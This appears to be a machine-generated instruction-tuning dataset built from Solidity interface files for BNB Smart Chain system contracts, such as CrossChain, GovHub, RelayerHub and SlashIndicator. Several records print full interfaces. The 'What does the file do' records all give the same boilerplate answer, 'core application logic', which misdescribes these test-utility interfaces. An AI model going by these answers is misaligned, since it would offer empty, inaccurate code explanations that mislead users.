SYSTEM_REWARD_ADDR() external view returns (address);\n    function TIMELOCK_ADDR() external view returns (address);\n    function TOKEN_HUB_ADDR() external view returns (address);\n    function TOKEN_MANAGER_ADDR() external view returns (address);\n    function TOKEN_RECOVER_PORTAL_ADDR() external view returns (address);\n    function TRANSFER_IN_CHANNELID() external view returns (uint8);\n    function TRANSFER_OUT_CHANNELID() external view returns (uint8);\n    function VALIDATOR_CONTRACT_ADDR() external view returns (address);\n    function alreadyInit() external view returns (bool);\n    function batchSizeForOracle() external view returns (uint256);\n    function bscChainID() external view returns (uint16);\n    function cancelTransfer(address tokenAddr, address attacker) external;\n    function challenge(\n        uint64[4] memory params,\n        bytes memory payload0,\n        bytes memory payload1,\n        bytes memory proof0,\n        bytes memory proof1\n    ) external;\n    function challenged(bytes32) external view returns (bool);\n    function channelHandlerContractMap(uint8) external view returns (address);\n    function channelReceiveSequenceMap(uint8) external view returns (uint64);\n    function channelSendSequenceMap(uint8) external view returns (uint64);\n    function channelSyncedHeaderMap(uint8) external view returns (uint64);\n    function emergencyProposals(bytes32)\n        external\n        view\n        returns (uint16 quorum, uint128 expiredAt, bytes32 contentHash);\n    function encodePayload(\n        uint8 packageType,\n        uint256 relayFee,\n        bytes memory msgBytes\n    ) external pure returns (bytes memory);\n    function handlePackage(\n        bytes memory payload,\n        bytes memory proof,\n        uint64 height,\n        uint64 packageSequence,\n        uint8 channelId\n    ) external;\n    function init() external;\n    function isRelayRewardFromSystemReward(uint8) external view returns (bool);\n    function isSuspended() external view returns (bool);\n    function oracleSequence() external view returns (int64);\n    function previousTxHeight() external view returns (uint256);\n    function quorumMap(bytes32) external view returns (uint16);\n    function registeredContractChannelMap(address, uint8) external view returns (bool);\n    function reopen() external;\n    function sendSynPackage(uint8 channelId, bytes memory msgBytes, uint256 relayFee) external;\n    function suspend() external;\n    function txCounter() external view returns (uint256);\n    function updateParam(string memory key, bytes memory value) external;\n}\n\n```"}
{"instruction": "What does the file ICrossChain.sol do?", "input": "```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface CrossChain {\n    event ProposalSubmitted(\n        bytes32 indexed proposalTypeHash,\n        address indexed proposer,\n        uint128 quorum,\n        uint128 expiredAt,\n        bytes32 contentHash\n    );\n    event Reopened(address indexed executor);\n    event SuccessChallenge(address indexed challenger, uint64 packageSequence, uint8 channelId);\n    event Suspended(address indexed executor);\n    event addChannel(uint8 indexed channelId, address indexed contractAddr);\n    event crossChainPackage(\n        uint16 chainId,\n        uint64 indexed oracleSequence,\n        uint64 indexed packageSequence,\n        uint8 indexed channelId,\n        bytes payload\n    );\n    event enableOrDisableChannel(uint8 indexed channelId, bool isEnable);\n    event paramChange(string key, bytes value);\n    event receivedPackage(uint8 packageType, uint64 indexed packageSequence, uint8 indexed channelId);\n    event unexpectedFailureAssertionInPackageHandler(address indexed contractAddr, bytes lowLevelData);\n    event unexpectedRevertInPackageHandler(address indexed contractAddr, string reason);\n    event unsupportedPackage(uint64 indexed packageSequence, uint8 indexed channelId, bytes payload);\n\n    function ACK_PACKAGE() external view returns (uint8);\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BIND_CHANNELID() external view returns (uint8);\n    function CANCEL_TRANSFER_PROPOSAL() external view returns (bytes32);\n    function CODE_OK() external view returns (uint32);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_CHAIN_KEY_PREFIX() external view returns (uint256);\n    function CROSS_STAKE_CHANNELID() external view returns (uint8);\n    function EMERGENCY_PROPOSAL_EXPIRE_PERIOD() external view returns (uint256);\n    function EMPTY_CONTENT_HASH() external view returns (bytes32);\n    function ERROR_FAIL_DECODE() external view returns (uint32);\n\n```", "output": "This file `ICrossChain.sol` is part of the interface project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IGovHub.sol which is part of the interface project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\interface\\IGovHub.sol`:\n\n```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface GovHub {\n    event failReasonWithBytes(bytes message);\n    event failReasonWithStr(string message);\n    event paramChange(string key, bytes value);\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BIND_CHANNELID() external view returns (uint8);\n    function CODE_OK() external view returns (uint32);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_STAKE_CHANNELID() external view returns (uint8);\n    function ERROR_FAIL_DECODE() external view returns (uint32);\n    function ERROR_TARGET_CONTRACT_FAIL() external view returns (uint32);\n    function ERROR_TARGET_NOT_CONTRACT() external view returns (uint32);\n    function GOVERNOR_ADDR() external view returns (address);\n    function GOV_CHANNELID() external view returns (uint8);\n    function GOV_HUB_ADDR() external view returns (address);\n    function GOV_TOKEN_ADDR() external view returns (address);\n    function INCENTIVIZE_ADDR() external view returns (address);\n    function LIGHT_CLIENT_ADDR() external view returns (address);\n    function PARAM_UPDATE_MESSAGE_TYPE() external view returns (uint8);\n    function RELAYERHUB_CONTRACT_ADDR() external view returns (address);\n    function SLASH_CHANNELID() external view returns (uint8);\n    function SLASH_CONTRACT_ADDR() external view returns (address);\n    function STAKE_CREDIT_ADDR() external view returns (address);\n    function STAKE_HUB_ADDR() external view returns (address);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function STAKING_CONTRACT_ADDR() external view returns (address);\n    function SYSTEM_REWARD_ADDR() external view returns (address);\n    function TIMELOCK_ADDR() external view returns (address);\n    function TOKEN_HUB_ADDR() external view returns (address);\n    function TOKEN_MANAGER_ADDR() external view returns (address);\n    function TOKEN_RECOVER_PORTAL_ADDR() external view returns (address);\n    function TRANSFER_IN_CHANNELID() external view returns (uint8);\n    function TRANSFER_OUT_CHANNELID() external view returns (uint8);\n    function VALIDATOR_CONTRACT_ADDR() external view returns (address);\n    function alreadyInit() external view returns (bool);\n    function bscChainID() external view returns (uint16);\n    function handleAckPackage(uint8, bytes memory) external;\n    function handleFailAckPackage(uint8, bytes memory) external;\n    function handleSynPackage(uint8, bytes memory msgBytes) external returns (bytes memory responsePayload);\n    function updateParam(string memory key, bytes memory value, address target) external;\n}\n\n```"}
{"instruction": "What does the file IGovHub.sol do?", "input": "```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface GovHub {\n    event failReasonWithBytes(bytes message);\n    event failReasonWithStr(string message);\n    event paramChange(string key, bytes value);\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BIND_CHANNELID() external view returns (uint8);\n    function CODE_OK() external view returns (uint32);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_STAKE_CHANNELID() external view returns (uint8);\n    function ERROR_FAIL_DECODE() external view returns (uint32);\n    function ERROR_TARGET_CONTRACT_FAIL() external view returns (uint32);\n    function ERROR_TARGET_NOT_CONTRACT() external view returns (uint32);\n    function GOVERNOR_ADDR() external view returns (address);\n    function GOV_CHANNELID() external view returns (uint8);\n    function GOV_HUB_ADDR() external view returns (address);\n    function GOV_TOKEN_ADDR() external view returns (address);\n    function INCENTIVIZE_ADDR() external view returns (address);\n    function LIGHT_CLIENT_ADDR() external view returns (address);\n    function PARAM_UPDATE_MESSAGE_TYPE() external view returns (uint8);\n    function RELAYERHUB_CONTRACT_ADDR() external view returns (address);\n    function SLASH_CHANNELID() external view returns (uint8);\n    function SLASH_CONTRACT_ADDR() external view returns (address);\n    function STAKE_CREDIT_ADDR() external view returns (address);\n    function STAKE_HUB_ADDR() external view returns (address);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function STAKING_CONTRACT_ADDR() external view returns (address);\n    function SYSTEM_REWARD_ADDR() external view returns (address);\n    function TIMELOCK_ADDR() external view returns (address);\n    function TOKEN_HUB_ADDR() external view returns (address);\n    function TOKEN_MANAGER_ADDR() external view returns (address);\n    function TOKEN_RECOVER_PORTAL_ADDR() external view returns (ad\n```", "output": "This file `IGovHub.sol` is part of the interface project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IGovToken.sol which is part of the interface project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\interface\\IGovToken.sol`:\n\n```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface GovToken {\n    struct Checkpoint {\n        uint32 fromBlock;\n        uint224 votes;\n    }\n\n    error ApproveNotAllowed();\n    error BurnNotAllowed();\n    error InvalidValue(string key, bytes value);\n    error OnlyCoinbase();\n    error OnlySystemContract(address systemContract);\n    error OnlyZeroGasPrice();\n    error TransferNotAllowed();\n    error UnknownParam(string key, bytes value);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);\n    event DelegateVotesChanged(address indexed delegate, uint256 previousBalance, uint256 newBalance);\n    event EIP712DomainChanged();\n    event Initialized(uint8 version);\n    event ParamChange(string key, bytes value);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function CLOCK_MODE() external view returns (string memory);\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function burn(uint256) external pure;\n    function burnFrom(address, uint256) external pure;\n    function checkpoints(address account, uint32 pos) external view returns (Checkpoint memory);\n    function clock() external view returns (uint48);\n    function decimals() external view returns (uint8);\n    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);\n    function delegate(address delegatee) external;\n    function delegateBySig(address delegatee, uint256 nonce, uint256 expiry, uint8 v, bytes32 r, bytes32 s) external;\n    function delegateVote(address delegator, address delegatee) external;\n    function delegates(address account) external view returns (address);\n    function eip712Domain()\n        external\n        view\n        returns (\n            bytes1 fields,\n            string memory name,\n            string memory version,\n            uint256 chainId,\n            address verifyingContract,\n            bytes32 salt,\n            uint256[] memory extensions\n        );\n    function getPastTotalSupply(uint256 timepoint) external view returns (uint256);\n    function getPastVotes(address account, uint256 timepoint) external view returns (uint256);\n    function getVotes(address account) external view returns (uint256);\n    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);\n    function initialize() external;\n    function mintedMap(address, address) external view returns (uint256);\n    function name() external view returns (string memory);\n    function nonces(address owner) external view returns (uint256);\n    function numCheckpoints(address account) external view returns (uint32);\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n    function symbol() external view returns (string memory);\n    function sync(address stakeCredit, address account) external;\n    function syncBatch(address[] memory stakeCredits, address account) external;\n    function totalSupply() external view returns (uint256);\n    function transfer(address to, uint256 amount) external returns (bool);\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n}\n\n```"}
{"instruction": "What does the file IGovToken.sol do?", "input": "```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface GovToken {\n    struct Checkpoint {\n        uint32 fromBlock;\n        uint224 votes;\n    }\n\n    error ApproveNotAllowed();\n    error BurnNotAllowed();\n    error InvalidValue(string key, bytes value);\n    error OnlyCoinbase();\n    error OnlySystemContract(address systemContract);\n    error OnlyZeroGasPrice();\n    error TransferNotAllowed();\n    error UnknownParam(string key, bytes value);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);\n    event DelegateVotesChanged(address indexed delegate, uint256 previousBalance, uint256 newBalance);\n    event EIP712DomainChanged();\n    event Initialized(uint8 version);\n    event ParamChange(string key, bytes value);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function CLOCK_MODE() external view returns (string memory);\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function burn(uint256) external pure;\n    function burnFrom(address, uint256) external pure;\n    function checkpoints(address account, uint32 pos) external view returns (Checkpoint memory);\n    function clock() external view returns (uint48);\n    function decimals() external view returns (uint8);\n    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);\n    function delegate(address delegatee) external;\n    function delegateBySig(address delegatee, uint256 nonce, uint256 expiry, uint8 v, by\n```", "output": "This file `IGovToken.sol` is part of the interface project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IRelayerHub.sol which is part of the interface project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\interface\\IRelayerHub.sol`:\n\n```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface RelayerHub {\n    event managerAdded(address _addedManager);\n    event managerRemoved(address _removedManager);\n    event paramChange(string key, bytes value);\n    event relayerAddedProvisionally(address _relayer);\n    event relayerUnRegister(address _relayer);\n    event relayerUpdated(address _from, address _to);\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BIND_CHANNELID() external view returns (uint8);\n    function CODE_OK() external view returns (uint32);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_STAKE_CHANNELID() external view returns (uint8);\n    function ERROR_FAIL_DECODE() external view returns (uint32);\n    function GOVERNOR_ADDR() external view returns (address);\n    function GOV_CHANNELID() external view returns (uint8);\n    function GOV_HUB_ADDR() external view returns (address);\n    function GOV_TOKEN_ADDR() external view returns (address);\n    function INCENTIVIZE_ADDR() external view returns (address);\n    function INIT_DUES() external view returns (uint256);\n    function INIT_REQUIRED_DEPOSIT() external view returns (uint256);\n    function LIGHT_CLIENT_ADDR() external view returns (address);\n    function RELAYERHUB_CONTRACT_ADDR() external view returns (address);\n    function SLASH_CHANNELID() external view returns (uint8);\n    function SLASH_CONTRACT_ADDR() external view returns (address);\n    function STAKE_CREDIT_ADDR() external view returns (address);\n    function STAKE_HUB_ADDR() external view returns (address);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function STAKING_CONTRACT_ADDR() external view returns (address);\n    function SYSTEM_REWARD_ADDR() external view returns (address);\n    function TIMELOCK_ADDR() external view returns (address);\n    function TOKEN_HUB_ADDR() external view returns (address);\n    function TOKEN_MANAGER_ADDR() external view returns (address);\n    function TOKEN_RECOVER_PORTAL_ADDR() external view returns (address);\n    function TRANSFER_IN_CHANNELID() external view returns (uint8);\n    function TRANSFER_OUT_CHANNELID() external view returns (uint8);\n    function VALIDATOR_CONTRACT_ADDR() external view returns (address);\n    function WHITELIST_1() external view returns (address);\n    function WHITELIST_2() external view returns (address);\n    function acceptBeingRelayer(address manager) external;\n    function alreadyInit() external view returns (bool);\n    function bscChainID() external view returns (uint16);\n    function init() external;\n    function isManager(address managerAddress) external view returns (bool);\n    function isProvisionalRelayer(address relayerAddress) external view returns (bool);\n    function isRelayer(address relayerAddress) external view returns (bool);\n    function removeManagerByHimself() external;\n    function unregister() external;\n    function updateParam(string memory key, bytes memory value) external;\n    function updateRelayer(address relayerToBeAdded) external;\n    function whitelistInit() external;\n    function whitelistInitDone() external view returns (bool);\n}\n\n```"}
{"instruction": "What does the file IRelayerHub.sol do?", "input": "```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface RelayerHub {\n    event managerAdded(address _addedManager);\n    event managerRemoved(address _removedManager);\n    event paramChange(string key, bytes value);\n    event relayerAddedProvisionally(address _relayer);\n    event relayerUnRegister(address _relayer);\n    event relayerUpdated(address _from, address _to);\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BIND_CHANNELID() external view returns (uint8);\n    function CODE_OK() external view returns (uint32);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_STAKE_CHANNELID() external view returns (uint8);\n    function ERROR_FAIL_DECODE() external view returns (uint32);\n    function GOVERNOR_ADDR() external view returns (address);\n    function GOV_CHANNELID() external view returns (uint8);\n    function GOV_HUB_ADDR() external view returns (address);\n    function GOV_TOKEN_ADDR() external view returns (address);\n    function INCENTIVIZE_ADDR() external view returns (address);\n    function INIT_DUES() external view returns (uint256);\n    function INIT_REQUIRED_DEPOSIT() external view returns (uint256);\n    function LIGHT_CLIENT_ADDR() external view returns (address);\n    function RELAYERHUB_CONTRACT_ADDR() external view returns (address);\n    function SLASH_CHANNELID() external view returns (uint8);\n    function SLASH_CONTRACT_ADDR() external view returns (address);\n    function STAKE_CREDIT_ADDR() external view returns (address);\n    function STAKE_HUB_ADDR() external view returns (address);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function STAKING_CONTRACT_ADDR() external view returns (address);\n    function SYSTEM_REWARD_ADDR() external view returns (address);\n    function TIMELOCK_ADDR() external view returns (address);\n    function TOKEN_HUB_ADDR() external view returns (address);\n    function TOKEN_MANAGER_ADDR() external view returns (\n```", "output": "This file `IRelayerHub.sol` is part of the interface project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IRelayerIncentivize.sol which is part of the interface project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\interface\\IRelayerIncentivize.sol`:\n\n```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface RelayerIncentivize {\n    event distributeCollectedReward(\n        uint256 sequence, uint256 roundRewardForHeaderRelayer, uint256 roundRewardForTransferRelayer\n    );\n    event paramChange(string key, bytes value);\n    event rewardToRelayer(address relayer, uint256 amount);\n\n    receive() external payable;\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BIND_CHANNELID() external view returns (uint8);\n    function CALLER_COMPENSATION_DENOMINATOR() external view returns (uint256);\n    function CALLER_COMPENSATION_MOLECULE() external view returns (uint256);\n    function CODE_OK() external view returns (uint32);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_STAKE_CHANNELID() external view returns (uint8);\n    function ERROR_FAIL_DECODE() external view returns (uint32);\n    function GOVERNOR_ADDR() external view returns (address);\n    function GOV_CHANNELID() external view returns (uint8);\n    function GOV_HUB_ADDR() external view returns (address);\n    function GOV_TOKEN_ADDR() external view returns (address);\n    function HEADER_RELAYER_REWARD_RATE_DENOMINATOR() external view returns (uint256);\n    function HEADER_RELAYER_REWARD_RATE_MOLECULE() external view returns (uint256);\n    function INCENTIVIZE_ADDR() external view returns (address);\n    function LIGHT_CLIENT_ADDR() external view returns (address);\n    function MAXIMUM_WEIGHT() external view returns (uint256);\n    function RELAYERHUB_CONTRACT_ADDR() external view returns (address);\n    function ROUND_SIZE() external view returns (uint256);\n    function SLASH_CHANNELID() external view returns (uint8);\n    function SLASH_CONTRACT_ADDR() external view returns (address);\n    function STAKE_CREDIT_ADDR() external view returns (address);\n    function STAKE_HUB_ADDR() external view returns (address);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function STAKING_CONTRACT_ADDR() external view returns (address);\n    function SYSTEM_REWARD_ADDR() external view returns (address);\n    function TIMELOCK_ADDR() external view returns (address);\n    function TOKEN_HUB_ADDR() external view returns (address);\n    function TOKEN_MANAGER_ADDR() external view returns (address);\n    function TOKEN_RECOVER_PORTAL_ADDR() external view returns (address);\n    function TRANSFER_IN_CHANNELID() external view returns (uint8);\n    function TRANSFER_OUT_CHANNELID() external view returns (uint8);\n    function VALIDATOR_CONTRACT_ADDR() external view returns (address);\n    function addReward(\n        address payable headerRelayerAddr,\n        address payable packageRelayer,\n        uint256 amount,\n        bool fromSystemReward\n    ) external returns (bool);\n    function alreadyInit() external view returns (bool);\n    function bscChainID() external view returns (uint16);\n    function calculateHeaderRelayerWeight(uint256 count) external pure returns (uint256);\n    function calculateTransferRelayerWeight(uint256 count) external pure returns (uint256);\n    function callerCompensationDenominator() external view returns (uint256);\n    function callerCompensationMolecule() external view returns (uint256);\n    function claimRelayerReward(address relayerAddr) external;\n    function collectedRewardForHeaderRelayer() external view returns (uint256);\n    function collectedRewardForTransferRelayer() external view returns (uint256);\n    function countInRound() external view returns (uint256);\n    function dynamicExtraIncentiveAmount() external view returns (uint256);\n    function headerRelayerAddressRecord(uint256) external view returns (address payable);\n    function headerRelayerRewardRateDenominator() external view returns (uint256);\n    function headerRelayerRewardRateMolecule() external view returns (uint256);\n    function headerRelayersSubmitCount(address) external view returns (uint256);\n    function init() external;\n    function packageRelayerAddressRecord(uint256) external view returns (address payable);\n    function packageRelayersSubmitCount(address) external view returns (uint256);\n    function relayerRewardVault(address) external view returns (uint256);\n    function roundSequence() external view returns (uint256);\n    function updateParam(string memory key, bytes memory value) external;\n}\n\n```"}
{"instruction": "What does the file IRelayerIncentivize.sol do?", "input": "```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface RelayerIncentivize {\n    event distributeCollectedReward(\n        uint256 sequence, uint256 roundRewardForHeaderRelayer, uint256 roundRewardForTransferRelayer\n    );\n    event paramChange(string key, bytes value);\n    event rewardToRelayer(address relayer, uint256 amount);\n\n    receive() external payable;\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BIND_CHANNELID() external view returns (uint8);\n    function CALLER_COMPENSATION_DENOMINATOR() external view returns (uint256);\n    function CALLER_COMPENSATION_MOLECULE() external view returns (uint256);\n    function CODE_OK() external view returns (uint32);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_STAKE_CHANNELID() external view returns (uint8);\n    function ERROR_FAIL_DECODE() external view returns (uint32);\n    function GOVERNOR_ADDR() external view returns (address);\n    function GOV_CHANNELID() external view returns (uint8);\n    function GOV_HUB_ADDR() external view returns (address);\n    function GOV_TOKEN_ADDR() external view returns (address);\n    function HEADER_RELAYER_REWARD_RATE_DENOMINATOR() external view returns (uint256);\n    function HEADER_RELAYER_REWARD_RATE_MOLECULE() external view returns (uint256);\n    function INCENTIVIZE_ADDR() external view returns (address);\n    function LIGHT_CLIENT_ADDR() external view returns (address);\n    function MAXIMUM_WEIGHT() external view returns (uint256);\n    function RELAYERHUB_CONTRACT_ADDR() external view returns (address);\n    function ROUND_SIZE() external view returns (uint256);\n    function SLASH_CHANNELID() external view returns (uint8);\n    function SLASH_CONTRACT_ADDR() external view returns (address);\n    function STAKE_CREDIT_ADDR() external view returns (address);\n    function STAKE_HUB_ADDR() external view returns (address);\n    function STAKING_CHANNELID() external view returns (uint8);\n    f\n```", "output": "This file `IRelayerIncentivize.sol` is part of the interface project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for ISlashIndicator.sol which is part of the interface project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\interface\\ISlashIndicator.sol`:\n\n```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface SlashIndicator {\n    struct FinalityEvidence {\n        VoteData voteA;\n        VoteData voteB;\n        bytes voteAddr;\n    }\n\n    struct VoteData {\n        uint256 srcNum;\n        bytes32 srcHash;\n        uint256 tarNum;\n        bytes32 tarHash;\n        bytes sig;\n    }\n\n    event crashResponse();\n    event failedFelony(address indexed validator, uint256 slashCount, bytes failReason);\n    event indicatorCleaned();\n    event knownResponse(uint32 code);\n    event maliciousVoteSlashed(bytes32 indexed voteAddrSlice);\n    event paramChange(string key, bytes value);\n    event unKnownResponse(uint32 code);\n    event validatorSlashed(address indexed validator);\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BIND_CHANNELID() external view returns (uint8);\n    function CODE_OK() external view returns (uint32);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_STAKE_CHANNELID() external view returns (uint8);\n    function DECREASE_RATE() external view returns (uint256);\n    function ERROR_FAIL_DECODE() external view returns (uint32);\n    function FELONY_THRESHOLD() external view returns (uint256);\n    function GOVERNOR_ADDR() external view returns (address);\n    function GOV_CHANNELID() external view returns (uint8);\n    function GOV_HUB_ADDR() external view returns (address);\n    function GOV_TOKEN_ADDR() external view returns (address);\n    function INCENTIVIZE_ADDR() external view returns (address);\n    function INIT_FELONY_SLASH_REWARD_RATIO() external view returns (uint256);\n    function INIT_FELONY_SLASH_SCOPE() external view returns (uint256);\n    function LIGHT_CLIENT_ADDR() external view returns (address);\n    function MISDEMEANOR_THRESHOLD() external view returns (uint256);\n    function RELAYERHUB_CONTRACT_ADDR() external view returns (address);\n    function SLASH_CHANNELID() external view returns (uint8);\n    function SLASH_CONTRACT_ADDR() external view returns (address);\n    function STAKE_CREDIT_ADDR() external view returns (address);\n    function STAKE_HUB_ADDR() external view returns (address);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function STAKING_CONTRACT_ADDR() external view returns (address);\n    function SYSTEM_REWARD_ADDR() external view returns (address);\n    function TIMELOCK_ADDR() external view returns (address);\n    function TOKEN_HUB_ADDR() external view returns (address);\n    function TOKEN_MANAGER_ADDR() external view returns (address);\n    function TOKEN_RECOVER_PORTAL_ADDR() external view returns (address);\n    function TRANSFER_IN_CHANNELID() external view returns (uint8);\n    function TRANSFER_OUT_CHANNELID() external view returns (uint8);\n    function VALIDATOR_CONTRACT_ADDR() external view returns (address);\n    function alreadyInit() external view returns (bool);\n    function bscChainID() external view returns (uint16);\n    function clean() external;\n    function downtimeSlash(address validator, uint256 count, bool shouldRevert) external;\n    function enableMaliciousVoteSlash() external view returns (bool);\n    function felonySlashRewardRatio() external view returns (uint256);\n    function felonySlashScope() external view returns (uint256);\n    function felonyThreshold() external view returns (uint256);\n    function getSlashIndicator(address validator) external view returns (uint256, uint256);\n    function getSlashThresholds() external view returns (uint256, uint256);\n    function handleAckPackage(uint8, bytes memory msgBytes) external;\n    function handleFailAckPackage(uint8, bytes memory) external;\n    function handleSynPackage(uint8, bytes memory) external returns (bytes memory);\n    function indicators(address) external view returns (uint256 height, uint256 count, bool exist);\n    function init() external;\n    function misdemeanorThreshold() external view returns (uint256);\n    function previousHeight() external view returns (uint256);\n    function sendFelonyPackage(address validator) external;\n    function slash(address validator) external;\n    function submitDoubleSignEvidence(bytes memory header1, bytes memory header2) external;\n    function submitFinalityViolationEvidence(FinalityEvidence memory _evidence) external;\n    function updateParam(string memory key, bytes memory value) external;\n    function validators(uint256) external view returns (address);\n}\n\n```"}
{"instruction": "What does the file ISlashIndicator.sol do?", "input": "```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface SlashIndicator {\n    struct FinalityEvidence {\n        VoteData voteA;\n        VoteData voteB;\n        bytes voteAddr;\n    }\n\n    struct VoteData {\n        uint256 srcNum;\n        bytes32 srcHash;\n        uint256 tarNum;\n        bytes32 tarHash;\n        bytes sig;\n    }\n\n    event crashResponse();\n    event failedFelony(address indexed validator, uint256 slashCount, bytes failReason);\n    event indicatorCleaned();\n    event knownResponse(uint32 code);\n    event maliciousVoteSlashed(bytes32 indexed voteAddrSlice);\n    event paramChange(string key, bytes value);\n    event unKnownResponse(uint32 code);\n    event validatorSlashed(address indexed validator);\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BIND_CHANNELID() external view returns (uint8);\n    function CODE_OK() external view returns (uint32);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_STAKE_CHANNELID() external view returns (uint8);\n    function DECREASE_RATE() external view returns (uint256);\n    function ERROR_FAIL_DECODE() external view returns (uint32);\n    function FELONY_THRESHOLD() external view returns (uint256);\n    function GOVERNOR_ADDR() external view returns (address);\n    function GOV_CHANNELID() external view returns (uint8);\n    function GOV_HUB_ADDR() external view returns (address);\n    function GOV_TOKEN_ADDR() external view returns (address);\n    function INCENTIVIZE_ADDR() external view returns (address);\n    function INIT_FELONY_SLASH_REWARD_RATIO() external view returns (uint256);\n    function INIT_FELONY_SLASH_SCOPE() external view returns (uint256);\n    function LIGHT_CLIENT_ADDR() external view returns (address);\n    function MISDEMEANOR_THRESHOLD() external view returns (uint256);\n    function RELAYERHUB_CONTRACT_ADDR() external view returns (address);\n    function SLASH_CHANNELID() external view returns (uint8);\n    function \n```", "output": "This file `ISlashIndicator.sol` is part of the interface project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IStakeCredit.sol which is part of the interface project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\interface\\IStakeCredit.sol`:\n\n```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface StakeCredit {\n    struct UnbondRequest {\n        uint256 shares;\n        uint256 bnbAmount;\n        uint256 unlockTime;\n    }\n\n    error ApproveNotAllowed();\n    error Empty();\n    error InsufficientBalance();\n    error InvalidValue(string key, bytes value);\n    error NoClaimableUnbondRequest();\n    error NoUnbondRequest();\n    error OnlyCoinbase();\n    error OnlySystemContract(address systemContract);\n    error OnlyZeroGasPrice();\n    error OutOfBounds();\n    error RequestExisted();\n    error TransferFailed();\n    error TransferNotAllowed();\n    error UnknownParam(string key, bytes value);\n    error WrongInitContext();\n    error ZeroAmount();\n    error ZeroShares();\n    error ZeroTotalPooledBNB();\n    error ZeroTotalShares();\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    event Initialized(uint8 version);\n    event ParamChange(string key, bytes value);\n    event RewardReceived(uint256 rewardToAll, uint256 commission);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    receive() external payable;\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address 